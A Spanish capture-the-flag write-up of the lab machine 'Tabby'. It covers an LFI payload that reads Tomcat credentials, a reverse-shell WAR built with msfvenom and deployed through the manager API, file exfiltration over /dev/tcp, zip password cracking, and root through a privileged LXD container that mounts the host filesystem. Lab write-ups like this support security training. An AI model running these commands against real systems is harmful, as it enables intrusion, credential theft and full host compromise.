# Tabby

![](../../../../~gitbook/image.md)Publicado: 21 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Tabby es una máquina Linux de dificultad fácil que requiere la explotación de un Local File Inclusion (LFI) para extraer credenciales de Tomcat. La escalada inicial se consigue mediante la subida de un archivo WAR malicioso aprovechando el rol manager-script. La escalada de privilegios se realiza aprovechando la pertenencia al grupo lxd. El reto implica técnicas de enumeración web, explotación de LFI, análisis de archivos de configuración, crackeo de contraseñas y conocimiento sobre contenedores LXD para lograr acceso completo al sistema.La ruta de explotación incluye:- Descubrir un LFI en un sitio web
- Obtener credenciales de un archivo de configuración de Tomcat
- Desplegar un archivo WAR malicioso utilizando el API de Tomcat
- Crackear la contraseña de un archivo ZIP para reutilizarla y obtener acceso de usuario
- Escalar privilegios aprovechando la pertenencia al grupo lxd

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
http://10.10.10.194/![](../../../../~gitbook/image.md)Al enumerar sobre algunas de las secciones de este sitio web encontramos que al acceder a la sección news se está aplicando vhosting:![](../../../../~gitbook/image.md)⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 HTTP
http://megahosting.htb/news.php?file=statement![](../../../../~gitbook/image.md)Encontramos un mensaje de aviso en el que se indica que se ha producido una brecha de seguridad y el sitio ha sido modificado para eliminar la herramienta.Llama la atención ese parámetro file. Verificamos si es vulnerable a LFI y lo confirmamos con el siguiente payload:http://megahosting.htb/news.php?file=..//..//..//..//etc/passwd![](../../../../~gitbook/image.md)
#### Fuzzing de directorios
No encontramos nada relevante
#### 8080 HTTP
http://supersecurehotel.htb:8080![](../../../../~gitbook/image.md)Aquí vemos bastante información que podría combinarse con el LFI que hemos encontrado de cara a obtener un posible vector de ataque.Accedemos al manager pero las credenciales por defecto no funcionan (había que intentarlo)
http://megahosting.htb:8080/manager/html![](../../../../~gitbook/image.md)En la página anterior leemos que el archivo tomcat-users.xml se encuentra en: `/etc/tomcat9/tomcat-users.xml`.Abusamos del LFI para leer este fichero aunque no nos devuelva nada:http://megahosting.htb/news.php?file=..//..//..//..//etc/tomcat9/tomcat-users.xml![](../../../../~gitbook/image.md)Después de bucear un poco en google encontramos que el archivo tomcat-users.xml puede ubicarse tanto enUsamos el LFI con esta ubicación y leemos el archivo correctamente obteniendo una contraseña en texto claro:![](../../../../~gitbook/image.md)Con estas credenciales, accedemos correctamente al host manager:
#### Problemas en manager
Tanto la aplicación web del administrador como las aplicaciones web del administrador del host tienen enlaces desde la página predeterminada de Tomcat.NOTA: Por razones de seguridad, el uso de la aplicación web del administrador está restringido a usuarios con rol “manager-gui”. La aplicación web host-manager está restringida a usuarios con rol “admin-gui”. Los usuarios se definen en `/etc/tomcat9/tomcat-users.xml`.El usuario tomcat tiene `admin-gui`, pero no `manager-gui`, lo que significa que no puedo acceder a la aplicación web del administrador:![](../../../../~gitbook/image.md)Pero sí podemos acceder al host manager:http://megahosting.htb:8080/host-manager/html![](../../../../~gitbook/image.md)NO podemos hacer a priori gran cosa, revisando los roles que tiene este usuario, vemos que también tiene uno llamado manager-script:![](../../../../~gitbook/image.md)
#### Foothold
Este es un caso algo distinto al habitual porque nuestro usuario de tomcat solo tiene el manager-script role y no tiene el habitual manager-gui role, sin embargo, podemos usr esto para usar el tomcat /manager/text scripting API. Pero antes, debemos generar una reverse shell dentro un fichero .WAR, para ello podemos usar la herramienta msfvenom:Podemos ver la lista de comandos aquí:https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_CommandsAhora podemos usar el siguiente comando para subirlo. En el path podemos definir lo que queramos:![](../../../../~gitbook/image.md)Parece que funcionó. A continuación iniciamos un listener usando `nc`y luego dispararlo con `curl http://10.10.10.194:8080/test`. Recupero una conexión con un shell:![](../../../../~gitbook/image.md)
#### Mejora de la shell
Enumeramos el directorio de usuarios y vemos el directorio de un usuario llamado ash pero no tenemos permisos:Tampoco funciona reutilizar con este usuario la contraseña $3cureP4s5w0rd123!. Encontramos un archivo .zip en el directorio /var/www/htmlLo transferimos a nuestro host de ataque de la siguiente forma:En nuestro host de ataque ejecutamos:En el host comprometido ejecutamos:Hacemos un md5sum en origen y en destino para verificar la integridad de la transferencia.Al intentar descomprimirlo nos pide una contraseña, de primeras probamos con la que ya teníamos pero nos indica que es incorrecta:![](../../../../~gitbook/image.md)Usamos la herramienta zip2john para extraer un hash que podemos intentar crackear mediante un ataque con diccionario:![](../../../../~gitbook/image.md)Usamos john the ripper y el diccionario rockyou para intentar crackear el el hash:![](../../../../~gitbook/image.md)Obtenemos la contraseña. Descomprimimos de nuevo el .zip usando la contraseña obtenida `admin@it`No encontramos nada interesante al descomprimir el archivo, sin embargo, sí que descubrimos que la contraseña que hemos obtenido se está reutilizando por el usuario ash y obtenemos la primera flag:
#### 👑 Escalada de privilegios
Verificamos si hay algún usuario que pueda ejecutar algo como root:Verificamos los grupos del usuario ash:El grupo lxd es un grupo privilegiado.Si intentamos ejecutar lxc, vemos que el binario no está añadido al path y nos indica que debemos usar /snap/bin/lxc![](../../../../~gitbook/image.md)Lo añadimos al pathPara llevar a cabo la explotación y escalada de privilegios, descargamos en primer lugar la imagen de alpine en el host de ataque:Iniciamos un servidor web con python:En el host comprometido, descargamos el archivo:Importamos la imagenNos da un error y tras buscar información sobre él comprobamos que se está ejecutando una instancia de lxc de snap (confinada) y no tiene acceso a lo que hay en el directorio /tmpLa solución es mover la imagen de alpine a una ruta donde snap tenga acceso y volver a ejecutarUna vez hecho, si ahora listamos las imágenes:![](../../../../~gitbook/image.md)Ahora ejecutamos lo siguiente:NOTA: si nos da el error: Error: No storage pool found. Please create a new storage pool
Ejecutar esto para crear un pool llamado `default`, usando `dir` como backend:Ahora sí, de nuevoAhora nos movemos al path que habíamos montado en el contenedor /mnt/root y finalmente al directorio /root y obtenemos la flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.10.194
PING 10.10.10.194 (10.10.10.194) 56(84) bytes of data.
64 bytes from 10.10.10.194: icmp_seq=1 ttl=63 time=43.5 ms
64 bytes from 10.10.10.194: icmp_seq=2 ttl=63 time=43.5 ms

--- 10.10.10.194 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 43.452/43.468/43.485/0.016 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.194 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80,8080
```

```
nmap -sC -sV -p$ports 10.10.10.194 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 09:05 CEST
Nmap scan report for 10.10.10.143
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds

```

```
echo "10.10.10.194 megahosting.htb" | sudo tee -a /etc/hosts
```

```
feroxbuster -u http://megahosting.htb/ -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 404 -x php,xml
```

```
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
```

```
..//..//..//..//usr/share/tomcat9/etc/tomcat-users.xml
```

```
tomcat:$3cureP4s5w0rd123!
```

```
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.8 lport=443 -f war -o rev.war
```

```
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/test --upload-file rev.war
```

```
nc -nlvp 443
```

```
script /dev/null -c bash
CRTL+Z
stty raw echo; fg
reset xterm
export TERM=xterm
```

```
tomcat@tabby:/var/lib/tomcat9$ cd /home
tomcat@tabby:/home$ ls
ash
tomcat@tabby:/home$ cd ash
bash: cd: ash: Permission denied
tomcat@tabby:/home$
```

```
nc -nlvp 8888 > 16162020_backup.zip
```

```
cat  /dev/tcp/10.10.14.8/8888
```

```
zip2john 16162020_backup.zip > hash_zip.txt
```

```
john hash_zip.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
tomcat@tabby:/var/www/html/files$ su ash
Password:
ash@tabby:/var/www/html/files$ whoami
ash
ash@tabby:/var/www/html/files$
```

```
ash@tabby:~$ sudo -l
sudo: unable to open /run/sudo/ts/ash: Read-only file system
[sudo] password for ash:
Sorry, try again.
[sudo] password for ash:
Sorry, user ash may not run sudo on tabby.
ash@tabby:~$
```

```
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

```
export PATH=$PATH:/snap/bin
```

```
git clone https://github.com/saghul/lxd-alpine-builder.git
```

```
python3 -m http.server 80
```

```
wget 10.10.14.8/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```

```
ash@tabby:/tmp$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

Error: open alpine-v3.13-x86_64-20210218_0139.tar.gz: no such file or directory
ash@tabby:/tmp$ ls
```

```
ash@tabby:/tmp$ mv alpine-v3.13-x86_64-20210218_0139.tar.gz ~/
ash@tabby:/tmp$ cd ~
ash@tabby:~$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```

```
lxc image list
```

```
lxc storage create default dir
lxc profile device add default root disk path=/ pool=default
```

```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

```
cd /mnt/root
cd /root
```
